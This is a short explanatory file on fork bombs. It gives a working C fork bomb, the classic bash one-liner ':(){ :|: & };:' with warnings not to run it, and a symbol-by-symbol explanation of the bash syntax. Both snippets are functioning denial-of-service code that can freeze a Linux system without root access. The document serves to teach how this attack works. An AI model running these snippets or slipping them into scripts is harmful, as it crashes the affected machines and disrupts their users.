/*/ Fork Bomb is a program that harms a system by making it run out of memory. It forks processes 
infinitely to fill memory. The fork bomb is a form of denial-of-service (DoS) attack against a Linux 
based system. Once a successful fork bomb has been activated in a system it may not be possible to 
resume normal operation without rebooting the system as the only solution to a fork bomb is to destroy 
all instances of it.

/*/

// C program Sample  for FORK BOMB
// It is not recommended to run the program as
// it may make a system non-responsive.
#include <stdio.h>
#include <sys/types.h>
 
int main()
{
    while(1)
       fork();   
    return 0;
}

/*/Please do not run this command to ‘test’ it unless you are prepared for a crash and/or 
force-rebooting your system. Also, it doesn’t need root to run.
If you using terminal then bash script for fork() bomb script as below.

/*/

:(){ :|: & };:

/*/ Step by Step Explanation of the script:
:() means you are defining a function called :
{:|: &} means run the function: and send its output to the : function again and run that in the background.
: – load another copy of the ‘:’ function into memory
| – and pipe its output to
: – another copy of ‘:’ function, which has to be loaded into memory
Therefore, ‘:|:’ simply gets two copies of ‘:’ loaded whenever ‘:’ is called
& – disown the functions, if the first ‘:’ is killed, all of the functions that it has started should NOT be auto-killed
} – end of what to do when we say ‘:’
; Command Separator
: runs the function first time
/*/
